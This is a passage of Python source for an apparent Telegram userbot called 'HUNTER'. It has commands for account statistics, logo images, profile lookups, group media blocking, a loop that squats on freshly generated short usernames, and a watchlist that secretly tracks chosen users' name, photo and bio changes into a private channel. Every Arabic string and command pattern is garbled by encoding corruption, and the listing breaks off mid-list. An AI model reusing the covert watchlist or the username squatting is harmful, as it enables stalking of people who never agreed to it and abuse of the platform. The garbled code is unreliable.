    response = f"ŸÄìÜ© ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó**- üù¢ - ŸÖÿπŸÑŸàŸÖÿßÿ™ {full_name}** ìÜ™\n"
    response += f"**ŸÄìçπ‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µßìçª**\n"
    response += f"**- ÿßŸÑÿÆŸÄÿßÿµ :** {private_chats} \n"
    response += f"**- ÿßŸÑŸÖÿ¨ŸÖŸÄŸàÿπŸÄÿßÿ™ :** {groups} \n"
    response += f"**- ÿßŸÑŸÇŸÜŸÄŸàÿßÿ™ :** {broadcast_channels} \n"
    response += f"**- ÿßÿØŸÖŸÄŸÜ ŸÅŸä ŸÖÿ¨ŸÖŸàÿπÿßÿ™ :** {admin_in_groups} \n"
    response += f" ‚òÖ **ŸÖŸÄÿßŸÑŸÉ :** `{creator_in_groups}` \n"
    response += f" ‚òÖ **ÿßÿØŸÖŸÄŸÜ : ** `{admin_in_groups - creator_in_groups}` \n"
    response += f"**- ÿßÿØŸÖŸÄŸÜ ŸÅŸä ŸÇŸÜŸÄŸàÿßÿ™ :** {admin_in_broadcast_channels} \n"
    response += f" ‚òÖ **ŸÖŸÄÿßŸÑŸÉ :** `{creator_in_channels}` \n"
    response += (f" ‚òÖ **ÿßÿØŸÖŸÄŸÜ :** `{admin_in_broadcast_channels - creator_in_channels}` \n")
    response += f"**ŸÄUnread:** {unread} \n"
    response += f"**ŸÄUnread Mentions:** {unread_mentions} \n\n"
    response += f"üìå**- ÿßŸÑŸàŸÇŸÄÿ™ ÿßŸÑŸÖÿ≥ÿ™ÿ∫ŸÄÿ±ŸÇ üìü :** {stop_time:.02f} **ÿ´ŸÄÿßŸÜŸäŸÄŸá**"
    await cat.edit(response)

PICS_STR = []

@client.on(events.NewMessage(pattern=r".ŸÑŸàÿ¨Ÿà ?(.*)"))
async def lg1(userevent):
    event = await eor(userevent, "- ÿ¨ŸÄÿßÿ±Ÿê ÿµŸÜŸÄÿπ ŸÑŸÄŸàŸÇŸÄŸà ÿπŸÄÿ±ÿ®ŸÄŸä ÿ®ÿ≠ŸÇŸÄŸàŸÇŸÉ ...")
    text = userevent.pattern_match.group(1)
    if not text:
        await eor(userevent, "- ÿßŸÑÿßŸÖŸÄÿ± + ŸÜÿµ ÿßŸà ÿßŸÑÿßŸÖŸÄÿ± + ŸÜÿµ ÿ®ÿßŸÑŸÄÿ±ÿØ ÿπ ÿµŸÄŸàÿ±ÿ© ...")
        return
        
    arabic_text = "".join(char for char in text if char.isalpha() and char not in string.ascii_letters)
    if not arabic_text:
        await eor(userevent, "- ÿßŸÑÿ±ÿ¨ÿßÿ° ÿ•ÿØÿÆÿßŸÑ ŸÜÿµ ÿ®ÿßŸÑŸÑÿ∫ŸÄÿ© ÿßŸÑÿπÿ±ÿ®ŸäŸÄÿ© ŸÅŸÇŸÄÿ∑.\n.ŸÑŸàŸÇŸà + ŸÜÿµ ÿπŸÄÿ±ÿ®ŸÄŸä\n.ŸÑŸàŸÉŸà + ŸÜÿµ ÿßŸÜŸÉŸÄŸÑÿ¥")
        return
        
    if len(text) <= 8:
        font_size_ = 150
        strik = 10
    elif len(text) >= 9:
        font_size_ = 50
        strik = 5
    else:
        font_size_ = 130
        strik = 20
        
    if userevent.reply_to_msg_id:
        rply = await userevent.get_reply_message()
        logo_ = await userevent.client.download_media(rply)
    else:
        async for i in client.iter_messages("@Z_44_Z", filter=InputMessagesFilterPhotos):
            PICS_STR.append(i)
        pic = random.choice(PICS_STR)
        logo_ = await pic.download_media()
        
    img = Image.open(logo_)
    draw = ImageDraw.Draw(img)
    font = ImageFont.truetype("font.ttf", font_size_)
    image_widthz, image_heightz = img.size
    w = font.getsize(text)[0]
    h = font.getsize(text)[1]
    image_width, image_height = img.size
    draw.text(((image_width - w) / 2, (image_height - h) / 2), text, font=font, fill=(255, 255, 255), )
    w_ = (image_width - w) / 2
    h_ = (image_height - h) / 2
    draw.text((w_, h_), text, font=font, fill="white", stroke_width=strik, stroke_fill="black")
    
    file_name = "Andencento.png"
    img.save(file_name, "PNG")
    await userevent.client.send_file(userevent.chat_id, file_name)
    await userevent.delete()
    try:
        os.remove(file_name)
        os.remove(logo_)
    except BaseException:
        pass


private_locked = False

@client.on(events.NewMessage(from_users='me', pattern='.ŸÇŸÅŸÑ ÿßŸÑÿÆÿßÿµ'))
async def lock_private(event):
    global private_locked
    private_locked = True
    await event.edit("‚éô ÿßŸÑÿÆÿßÿµ ŸÖŸÇŸÅŸÑ ÿßŸÑÿ¢ŸÜ.")


@client.on(events.NewMessage(from_users='me', pattern='.ŸÅÿ™ÿ≠ ÿßŸÑÿÆÿßÿµ'))
async def unlock_private(event):
    global private_locked
    private_locked = False
    await event.edit("‚éô ÿßŸÑÿÆÿßÿµ ŸÖŸÅÿ™Ÿàÿ≠ ÿßŸÑÿ¢ŸÜ.")


@client.on(events.NewMessage(incoming=True))
async def delete_private_messages(event):
    global private_locked
    if private_locked and event.is_private:
        await event.delete()

Fa_rr_d = "‚Ä¢‚ùÉ"

@client.on(events.NewMessage(pattern=r"^.ŸÉÿ¥ŸÅ(?: |$)(.*)"))
async def kashf(event):
    if event.fwd_from:
        return

    input_str = event.pattern_match.group(1)
    if not input_str:
        await event.edit("Ÿäÿ±ÿ¨Ÿâ ÿ™ŸÇÿØŸäŸÖ ŸÖÿπÿ±ŸëŸÅ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ£Ÿà ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ£Ÿà ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ")
        return

    try:
        user = await event.client.get_entity(input_str)
    except ValueError as e:
        await event.edit(f"ÿÆÿ∑ÿ£: {e}")
        return

    try:
        full_user = await event.client(functions.users.GetFullUserRequest(user.id))
    except ValueError as e:
        await event.edit(f"ÿÆÿ∑ÿ£: {e}")
        return

    user_id = user.id
    first_name = user.first_name
    full_name = f"{first_name} {user.last_name}" if user.last_name else first_name
    username = user.username
    photo = await event.client.download_profile_photo(user_id, "kashf.jpg", download_big=True)
    rotbat = "‚åÅ ŸÖÿ∑Ÿàÿ± ÿßŸÑÿ≥Ÿàÿ±ÿ≥ ÿßŸÑÿ±ÿ≥ŸÖŸä ìÑÇìÜÉ ‚åÅ" if user_id == 6383191007 else ("‚åÅ ÿßŸÑÿπÿ∂ŸÄŸà ìÖ´ ‚åÅ")
    rotbat = "‚åÅ ŸÖŸÄÿßŸÑŸÉ ÿßŸÑÿ≠ÿ≥ÿßÿ® ìÄ´ ‚åÅ" if user_id == (await event.client.get_me()).id and user_id != 6383191007 else rotbat
    caption = f"ŸÄ‚úõ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚úõ\n"
    caption += f" {Fa_rr_d}‚ïéÿßŸÑÿßÿ≥ŸÄŸÖ ‚á† {full_name}\n"
    caption += f" {Fa_rr_d}‚ïéÿßŸÑŸÖÿπŸÄÿ±ŸÅ ‚á† @{username}\n"
    caption += f" {Fa_rr_d}‚ïéÿßŸÑÿßŸäŸÄÿØŸä ‚á† {user_id}\n"
    caption += f" {Fa_rr_d}‚ïéÿßŸÑÿ±ÿ™ÿ®ŸÄŸÄŸÄŸá ‚á† {rotbat}\n"
    caption += f" {Fa_rr_d}‚ïéÿßŸÑÿ≠ÿ≥ÿßÿ® ‚á† [{full_name}](tg://openmessage?user_id={user_id})\n"
    caption += f"ŸÄ‚úõ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚úõ"

    await event.client.send_file(event.chat_id, photo, caption=caption)
    await event.delete()


import random
import asyncio


hunting_active = False
hunting_pattern = ""
channel_id = None
hunting_attempts = 0

def generate_username(pattern):
    username = ""
    for char in pattern:
        if char in ["H", "B"]:
            username += random.choice("abcdefghijklmnopqrstuvwxyz")
        elif char == "4":
            username += random.choice("0123456789")
        else:
            username += char
    return username

def get_pattern_by_type(hunt_type):
    patterns = {
        "ÿ´ŸÑÿßÿ´Ÿä1": "H_B_H",
        "ÿÆŸÖÿßÿ≥Ÿä ÿßÿ±ŸÇÿßŸÖ": "HB444",
        "ÿ´ŸÑÿßÿ´Ÿä2": "H_4_B",
        "ÿ´ŸÑÿßÿ´Ÿä3": "H_4_0",
        "ÿ±ÿ®ÿßÿπŸä1": "HHH_B",
        "ÿ±ÿ®ÿßÿπŸä2": "H_BBB",
        "ÿ±ÿ®ÿßÿπŸä3": "HH_BB",
        "ÿ±ÿ®ÿßÿπŸä4": "HH_HB",
        "ÿ±ÿ®ÿßÿπŸä5": "HH_BH",
        "ÿ±ÿ®ÿßÿπŸä6": "HB_BH",
        "ÿ±ÿ®ÿßÿπŸä7": "HB_HB",
        "ÿ±ÿ®ÿßÿπŸä8": "HB_BB",
        "ÿ¥ÿ®Ÿá ÿ±ÿ®ÿßÿπŸä1": "H_H_H_B",
        "ÿ¥ÿ®Ÿá ÿ±ÿ®ÿßÿπŸä2": "H_B_B_B",
        "ÿ¥ÿ®Ÿá ÿ±ÿ®ÿßÿπŸä3": "H_BB_H",
        "ÿ¥ÿ®Ÿá ÿ±ÿ®ÿßÿπŸä4": "H_BB_B",
        "ÿÆŸÖÿßÿ≥Ÿä ÿ≠ÿ±ŸÅŸäŸÜ1": "HHHBR",
        "ÿÆŸÖÿßÿ≥Ÿä ÿ≠ÿ±ŸÅŸäŸÜ2": "H4BBB",
        "ÿÆŸÖÿßÿ≥Ÿä ÿßÿ±ŸÇÿßŸÖ": "HB444",
        "ÿÆŸÖÿßÿ≥Ÿä ÿ≠ÿ±ŸÅŸäŸÜ3": "HBBBR",
        "ÿ≥ÿØÿßÿ≥Ÿä_ÿ≠ÿ±ŸÅŸäŸÜ1": "HBHHHB",
        "ÿ≥ÿØÿßÿ≥Ÿä_ÿ≠ÿ±ŸÅŸäŸÜ2": "HHHHBB",
        "ÿ≥ÿØÿßÿ≥Ÿä_ÿ≠ÿ±ŸÅŸäŸÜ3": "HHHBBH",
        "ÿ≥ÿØÿßÿ≥Ÿä_ÿ≠ÿ±ŸÅŸäŸÜ4": "HHBBHH",
        "ÿ≥ÿØÿßÿ≥Ÿä_ÿ≠ÿ±ŸÅŸäŸÜ5": "HBBHHH",
        "ÿ≥ÿØÿßÿ≥Ÿä_ÿ≠ÿ±ŸÅŸäŸÜ6": "HHBBBB",
        "ÿ≥ÿØÿßÿ≥Ÿä_ÿ¥ÿ±ÿ∑Ÿá": "HHHH_B",
        "ÿ≥ÿ®ÿßÿπŸäÿßÿ™1": "HHHHHHB",
        "ÿ≥ÿ®ÿßÿπŸäÿßÿ™2": "HHHHHBH",
        "ÿ≥ÿ®ÿßÿπŸäÿßÿ™3": "HHHHBHH",
        "ÿ≥ÿ®ÿßÿπŸäÿßÿ™4": "HHHBHHH",
        "ÿ≥ÿ®ÿßÿπŸäÿßÿ™5": "HHBHHHH",
        "ÿ≥ÿ®ÿßÿπŸäÿßÿ™6": "HBHHHHH",
        "ÿ≥ÿ®ÿßÿπŸäÿßÿ™7": "HBBBBBB",
        "ÿ®Ÿàÿ™ÿßÿ™1": "HB_Bot",
        "ÿ®Ÿàÿ™ÿßÿ™2": "H_BBot",
        "ÿ®Ÿàÿ™ÿßÿ™3": "HB4Bot",
        "ÿ®Ÿàÿ™ÿßÿ™4": "H4BBot",
        "ÿ®Ÿàÿ™ÿßÿ™5": "H44Bot",
        "ÿ®Ÿàÿ™ÿßÿ™6": "HRBBot",
        "ÿ®Ÿàÿ™ÿßÿ™7": "HHBBot",
        "ÿ®Ÿàÿ™ÿßÿ™8": "HHBBot",
        "ÿ®Ÿàÿ™ÿßÿ™9": "HH4Bot"
    }
    return patterns.get(hunt_type, hunt_type)

async def create_channel(client):
    global channel_id
    try:
        result = await client(functions.channels.CreateChannelRequest(
            title="ÿµŸäÿØ ÿ≥Ÿàÿ±ÿ≥ HUNTER",
            about="ŸÇŸÜÿßŸá ŸÑÿµŸäÿØ ÿßŸÑŸäŸàÿ≤ÿ±ÿßÿ™ ÿ™ÿßÿ®ÿπŸá ŸÑÿ≥Ÿàÿ±ÿ≥ HUNTER",
            megagroup=False
        ))
        if result.chats:
            channel_id = result.chats[0].id
            return channel_id
    except Exception as e:
        print(f"ÿÆÿ∑ÿ£ ŸÅŸä ÿ•ŸÜÿ¥ÿßÿ° ÿßŸÑŸÇŸÜÿßÿ©: {e}")
    return None

async def set_channel_username(client, username):
    global channel_id
    if channel_id is not None:
        try:
            await client(functions.channels.UpdateUsernameRequest(
                channel=channel_id, username=username
            ))
            return True
        except Exception as e:
            print(f"ÿÆÿ∑ÿ£ ŸÅŸä ÿ™ÿ≠ÿØŸäÿ´ ÿßÿ≥ŸÖ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: {e}")
            return False
    return False

@client.on(events.NewMessage(pattern=r".ÿµŸäÿØ (.+)"))
async def start_hunting(event):
    global hunting_active, hunting_pattern, hunting_attempts, channel_id

    if hunting_active:
        await event.edit("ÿßŸÑÿµŸäÿØ ŸÇŸäÿØ ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ ÿ®ÿßŸÑŸÅÿπŸÑ!")
        return

    hunt_type = event.pattern_match.group(1)
    hunting_pattern = get_pattern_by_type(hunt_type)
    hunting_active = True
    hunting_attempts = 0

    await event.edit(f"**‚éâ‚ïéÿ™ŸÖ ÿ®ŸÄÿØÿ° ÿßŸÑÿµŸäŸÄÿØ .. ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚òëÔ∏è\n ‚éâ‚ïéÿπŸÑŸÄŸâ ÿßŸÑŸÜŸÄŸàÿπ {hunting_pattern}\n ‚éâ‚ïéŸÑŸÖÿπÿ±ŸÅŸÄÿ© ÿ≠ÿßŸÑÿ© ÿπŸÖŸÑŸäŸÄÿ© ÿßŸÑÿµŸäŸÄÿØ ( `.ÿ≠ÿßŸÑÿ© ÿßŸÑÿµŸäÿØ` )\n‚éâ‚ïéŸÑŸÄ ÿßŸäŸÇŸÄÿßŸÅ ÿπŸÖŸÑŸäŸÄÿ© ÿßŸÑÿµŸäŸÄÿØ ( `.ÿßŸäŸÇÿßŸÅ ÿµŸäÿØ`  )**")
    
    await hunt_username(event, event.client, hunting_pattern)


async def hunt_username(event, client, hunting_pattern):
    global hunting_active, hunting_attempts, channel_id

    channel_id = await create_channel(client)
    if not channel_id:
        await event.reply("**ŸÅÿ¥ŸÑ ÿ•ŸÜÿ¥ÿßÿ° ÿßŸÑŸÇŸÜÿßÿ©ÿå ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿµÿ≠ÿ© ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™.**")
        hunting_active = False
        return

    while hunting_active:
        username = generate_username(hunting_pattern)
        hunting_attempts += 1
        try:
            result = await client(functions.account.CheckUsernameRequest(username))
            if result:
                success = await set_channel_username(client, username)
                if success:
                    await event.respond(f"ÿ™ŸÖ ÿ≠ÿ¨ÿ≤ ÿßŸÑŸäŸàÿ≤ÿ± ÿ®ŸÜÿ¨ÿßÿ≠: @{username}")
                    hunting_active = False
                    break
                else:
                    await event.respond(f"ÿßŸÑŸäŸàÿ≤ÿ± @{username} ŸÖÿ™ÿßÿ≠ ŸÑŸÉŸÜŸá ŸÑŸÖ ŸäŸèÿπŸäŸÜ ŸÑŸÑŸÇŸÜÿßÿ©.")
        except Exception as e:
            print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")
        await asyncio.sleep(2)

@client.on(events.NewMessage(pattern=r".ÿßŸäŸÇÿßŸÅ ÿßŸÑÿµŸäÿØ"))
async def stop_hunting(event):
    global hunting_active
    hunting_active = False
    await event.edit("ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ÿßŸÑÿµŸäÿØ.")

@client.on(events.NewMessage(pattern=r".ÿ≠ÿßŸÑÿ© ÿßŸÑÿµŸäÿØ"))
async def hunting_status(event):
    status = "‚éô ŸÇŸäÿØ ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ" if hunting_active else "‚éô ŸÖÿ™ŸàŸÇŸÅ"
    await event.edit(f"‚éô ÿ≠ÿßŸÑÿ© ÿßŸÑÿµŸäÿØ: {status}\n‚éô ÿπÿØÿØ ÿßŸÑŸÖÿ≠ÿßŸàŸÑÿßÿ™: {hunting_attempts}")


protection_file = "group_protection.pkl"


if os.path.exists(protection_file):
    with open(protection_file, "rb") as f:
        group_protection_settings = pickle.load(f)
else:
    group_protection_settings = {}

protection_mapping = {
    "ÿßŸÑÿµŸàÿ±": "photos",
    "ÿßŸÑŸÖÿ™ÿ≠ÿ±ŸÉÿ©": "gifs",
    "ÿßŸÑŸÖŸÑÿµŸÇÿßÿ™": "stickers",
    "ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ": "forwards",
    "ÿßŸÑŸÅŸäÿØŸäŸàŸáÿßÿ™": "videos",
    "ÿßŸÑÿ±Ÿàÿßÿ®ÿ∑": "links",
    "ÿßŸÑÿ®ÿµŸÖÿßÿ™": "voice_notes",
    "ÿßŸÑÿØÿ±ÿØÿ¥ÿ©": "chat"
}


@client.on(events.NewMessage(pattern=r'\.(ŸÅÿπŸÑ|ÿπÿ∑ŸÑ) (ÿßŸÑÿµŸàÿ±|ÿßŸÑŸÖÿ™ÿ≠ÿ±ŸÉÿ©|ÿßŸÑŸÖŸÑÿµŸÇÿßÿ™|ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ|ÿßŸÑŸÅŸäÿØŸäŸàŸáÿßÿ™|ÿßŸÑÿ±Ÿàÿßÿ®ÿ∑|ÿßŸÑÿ®ÿµŸÖÿßÿ™|ÿßŸÑÿØÿ±ÿØÿ¥ÿ©)'))
async def toggle_protection(event):
    chat_id = event.chat_id
    sender = await event.get_sender()


    try:
        admins = await client.get_participants(chat_id, filter=types.ChannelParticipantsAdmins)
        admin_ids = {admin.id for admin in admins}
    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ¨ŸÑÿ® ÿßŸÑŸÖÿ¥ÿ±ŸÅŸäŸÜ. ÿ™ÿ£ŸÉÿØ ÿ£ŸÜ ÿßŸÑÿ®Ÿàÿ™ ŸÑÿØŸäŸá ÿßŸÑÿµŸÑÿßÿ≠Ÿäÿßÿ™ ÿßŸÑŸÉÿßŸÅŸäÿ©.\n‚ö†Ô∏è ÿßŸÑÿ™ŸÅÿßÿµŸäŸÑ: {str(e)}")
        return


    if sender.id not in admin_ids:
        await event.reply("‚éô Ÿäÿ¨ÿ® ÿ£ŸÜ ÿ™ŸÉŸàŸÜ ŸÖÿ¥ÿ±ŸÅŸãÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ±!")
        return

    action, protection_type = event.pattern_match.groups()

    if chat_id not in group_protection_settings:
        group_protection_settings[chat_id] = {key: False for key in protection_mapping.values()}


    setting_key = protection_mapping[protection_type]
    group_protection_settings[chat_id][setting_key] = (action == "ŸÅÿπŸÑ")


    with open(protection_file, "wb") as f:
        pickle.dump(group_protection_settings, f)

    status = "‚éô ÿ™ŸÖ ÿßŸÑÿ™ŸÅÿπŸäŸÑ" if action == "ŸÅÿπŸÑ" else "‚éô ÿ™ŸÖ ÿßŸÑÿ™ÿπÿ∑ŸäŸÑ"
    await event.reply(f"{status} {protection_type} ŸÅŸä Ÿáÿ∞Ÿá ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ©.")


@client.on(events.NewMessage(pattern=r'\.ÿßŸÑÿ≠ŸÖÿßŸäÿ©'))
async def show_protection_status(event):
    chat_id = event.chat_id

    if chat_id not in group_protection_settings:
        await event.reply("‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿ£Ÿä ÿ•ÿπÿØÿßÿØÿßÿ™ ÿ≠ŸÖÿßŸäÿ© ŸÑŸáÿ∞Ÿá ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© ÿ®ÿπÿØ.")
        return

    settings = group_protection_settings[chat_id]
    status_list = [f"‚Ä¢ {name}: {'‚éô ŸÖŸÅÿπŸÑÿ©' if settings[key] else '‚éô ŸÖÿπÿ∑ŸÑÿ©'}" for name, key in protection_mapping.items()]
    
    await event.reply("‚éô ÿ•ÿπÿØÿßÿØÿßÿ™ ÿßŸÑÿ≠ŸÖÿßŸäÿ© ÿßŸÑÿ≠ÿßŸÑŸäÿ©:\n\n" + "\n".join(status_list))

watchlist_file = "watchlist.pkl"
monitoring_group_file = "monitoring_group.pkl"
user_data_file = "user_data.pkl"

watchlist = {}
user_data = {}
monitoring_group = None

if os.path.exists(watchlist_file):
    with open(watchlist_file, "rb") as f:
        watchlist = pickle.load(f)

if os.path.exists(user_data_file):
    with open(user_data_file, "rb") as f:
        user_data = pickle.load(f)

if os.path.exists(monitoring_group_file):
    with open(monitoring_group_file, "rb") as f:
        monitoring_group = pickle.load(f)


def save_watchlist():
    with open(watchlist_file, "wb") as f:
        pickle.dump(watchlist, f)

def save_user_data():
    with open(user_data_file, "wb") as f:
        pickle.dump(user_data, f)

def save_monitoring_group():
    with open(monitoring_group_file, "wb") as f:
        pickle.dump(monitoring_group, f)

async def ensure_monitoring_group():
    global monitoring_group
    if monitoring_group:
        return monitoring_group  

    try:
        result = await client(functions.channels.CreateChannelRequest(
            title="üì° ŸÖÿ¨ŸÖŸàÿπÿ© ÿßŸÑŸÖÿ±ÿßŸÇÿ®ÿ©",
            about="ŸÇŸÜÿßÿ© ÿÆÿßÿµÿ© ŸÑŸÖÿ±ÿßŸÇÿ®ÿ© ÿßŸÑÿ£ÿ¥ÿÆÿßÿµ ŸÑÿ≥Ÿàÿ±ÿ≥ HUNTER",
            megagroup=True
        ))
        monitoring_group = result.chats[0].id
        save_monitoring_group()
        print(f"‚éô ÿ™ŸÖ ÿ•ŸÜÿ¥ÿßÿ° ŸÖÿ¨ŸÖŸàÿπÿ© ÿßŸÑŸÖÿ±ÿßŸÇÿ®ÿ©: {monitoring_group}")
    except Exception as e:
        print(f"‚éô ŸÅÿ¥ŸÑ ÿ•ŸÜÿ¥ÿßÿ° ŸÖÿ¨ŸÖŸàÿπÿ© ÿßŸÑŸÖÿ±ÿßŸÇÿ®ÿ©: {e}")
        monitoring_group = None

    return monitoring_group


@client.on(events.NewMessage(pattern=r"\.ŸÖÿ±ÿßŸÇÿ®ÿ© (.+)"))
async def start_watching(event):
    global monitoring_group
    username = event.pattern_match.group(1)

   
    monitoring_group = await ensure_monitoring_group()

    if monitoring_group is None:
        await event.reply("‚éô ŸÅÿ¥ŸÑ ŸÅŸä ÿ•ŸÜÿ¥ÿßÿ° ŸÖÿ¨ŸÖŸàÿπÿ© ÿßŸÑŸÖÿ±ÿßŸÇÿ®ÿ©. ÿ≠ÿßŸàŸÑ ŸÑÿßÿ≠ŸÇŸãÿß.")
        return

    try:
        user = await client.get_entity(username)
        if user.id in watchlist:
            await event.reply(f"‚éô ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ @{username} ŸÇŸäÿØ ÿßŸÑŸÖÿ±ÿßŸÇÿ®ÿ© ÿ®ÿßŸÑŸÅÿπŸÑ.")
            return
        
        watchlist[user.id] = user.username or f"ID_{user.id}"
        user_data[user.id] = {
            'name': user.first_name,
            'photo': None,
            'status': None,
            'bio': None
        }
        save_watchlist()
        save_user_data()
        await event.reply(f"‚éô ÿ®ÿØÿ£ÿ™ ŸÖÿ±ÿßŸÇÿ®ÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: @{watchlist[user.id]}")
    except Exception as e:
        await event.reply(f"‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ @{username}.")
        print(f"Error: {e}")
        
@client.on(events.NewMessage(pattern=r"\.ÿßŸäŸÇÿßŸÅ_ÿßŸÑŸÖÿ±ÿßŸÇÿ®ÿ© (.+)"))
async def stop_watching(event):
    username = event.pattern_match.group(1)
    
    try:
        user = await client.get_entity(username)
        if user.id in watchlist:
            del watchlist[user.id]
            del user_data[user.id]
            save_watchlist()
            save_user_data()
            await event.reply(f"‚éô ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ŸÖÿ±ÿßŸÇÿ®ÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: @{username}")
        else:
            await event.reply(f"‚éô ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ @{username} ÿ∫Ÿäÿ± ŸÖŸàÿ¨ŸàÿØ ŸÅŸä ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÖÿ±ÿßŸÇÿ®ÿ©.")
    except Exception as e:
        await event.reply(f"‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ @{username}.")
        print(f"Error: {e}")


@client.on(events.UserUpdate)
async def user_update_handler(event):
    global monitoring_group
    if not monitoring_group:
        return  

    user_id = event.user_id
    if user_id in watchlist:
        try:
            user = await client.get_entity(user_id)
            old_data = user_data.get(user_id, {})
            changes = []

            
            if user.first_name != old_data.get('name'):
                changes.append(f"üìå ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑÿ¨ÿØŸäÿØ: {user.first_name}")
                user_data[user_id]['name'] = user.first_name

           
            if user.username and user.username != watchlist[user_id]:
                changes.append(f"üîó ÿßŸÑŸäŸàÿ≤ÿ± ÿßŸÑÿ¨ÿØŸäÿØ: @{user.username}")
                watchlist[user_id] = user.username

            
            photos = await client.get_profile_photos(user_id, limit=1)
            if photos:
                new_photo_id = photos[0].id
                if new_photo_id != old_data.get('photo'):
                    changes.append("üñºÔ∏è ŸÇÿßŸÖ ÿ®ÿ™ÿ∫ŸäŸäÿ± ÿµŸàÿ±ÿ™Ÿá ÿßŸÑÿ¥ÿÆÿµŸäÿ©")
                    user_data[user_id]['photo'] = new_photo_id

            
            full_user = await client(functions.users.GetFullUserRequest(user))
            if full_user.about and full_user.about != old_data.get('bio'):
                changes.append(f"üìù ŸÇÿßŸÖ ÿ®ÿ™ÿ∫ŸäŸäÿ± ÿßŸÑÿ®ÿßŸäŸà: {full_user.about}")
                user_data[user_id]['bio'] = full_user.about

            
            save_user_data()
            save_watchlist()

            
            if changes:
                user_mention = f"@{watchlist[user_id]}" if watchlist[user_id].startswith("@") else f"ID: {user_id}"
                await client.send_message(monitoring_group, f"‚éô ÿ™ÿ≠ÿØŸäÿ´ ŸÅŸä ÿ≠ÿ≥ÿßÿ® {user_mention}:\n\n" + "\n".join(changes))
        except Exception as e:
            print(f"Error updating user {user_id}: {e}")


update_tasks = {}
time_formats = [
    "üü¢ ÿßŸÑŸäŸàÿ≤ÿ±ÿßÿ™ ÿßŸÑÿ´ŸÑÿßÿ´Ÿäÿ©:",
    "‚û§ .ÿµŸäÿØ ÿ´ŸÑÿßÿ´Ÿä1  - ŸÖÿ´ÿßŸÑ: H_R_B",
    "‚û§ .ÿµŸäÿØ ÿ´ŸÑÿßÿ´Ÿä2  - ŸÖÿ´ÿßŸÑ: H_4_B",
    "‚û§ .ÿµŸäÿØ ÿ´ŸÑÿßÿ´Ÿä3  - ŸÖÿ´ÿßŸÑ: H_4_0",

    "üü° ÿßŸÑŸäŸàÿ≤ÿ±ÿßÿ™ ÿßŸÑÿ±ÿ®ÿßÿπŸäÿ©:",
    "‚û§ .ÿµŸäÿØ ÿ±ÿ®ÿßÿπŸä1  - ŸÖÿ´ÿßŸÑ: HHH_B",
    "‚û§ .ÿµŸäÿØ ÿ±ÿ®ÿßÿπŸä2  - ŸÖÿ´ÿßŸÑ: H_BBB",
    "‚û§ .ÿµŸäÿØ ÿ±ÿ®ÿßÿπŸä3  - ŸÖÿ´ÿßŸÑ: HH_BB",
    "‚û§ .ÿµŸäÿØ ÿ±ÿ®ÿßÿπŸä4  - ŸÖÿ´ÿßŸÑ: HH_HB",
    "‚û§ .ÿµŸäÿØ ÿ±ÿ®ÿßÿπŸä5  - ŸÖÿ´ÿßŸÑ: HH_BH",
    "‚û§ .ÿµŸäÿØ ÿ±ÿ®ÿßÿπŸä6  - ŸÖÿ´ÿßŸÑ: HB_BH",
    "‚û§ .ÿµŸäÿØ ÿ±ÿ®ÿßÿπŸä7  - ŸÖÿ´ÿßŸÑ: HB_HB",
    "‚û§ .ÿµŸäÿØ ÿ±ÿ®ÿßÿπŸä8  - ŸÖÿ´ÿßŸÑ: HB_BB",

    "üü† ÿßŸÑŸäŸàÿ≤ÿ±ÿßÿ™ ÿ¥ÿ®Ÿá ÿßŸÑÿ±ÿ®ÿßÿπŸäÿ©:",
    "‚û§ .ÿµŸäÿØ ÿ¥ÿ®Ÿá ÿ±ÿ®ÿßÿπŸä1  - ŸÖÿ´ÿßŸÑ: H_H_H_B",
    "‚û§ .ÿµŸäÿØ ÿ¥ÿ®Ÿá ÿ±ÿ®ÿßÿπŸä2  - ŸÖÿ´ÿßŸÑ: H_B_B_B",
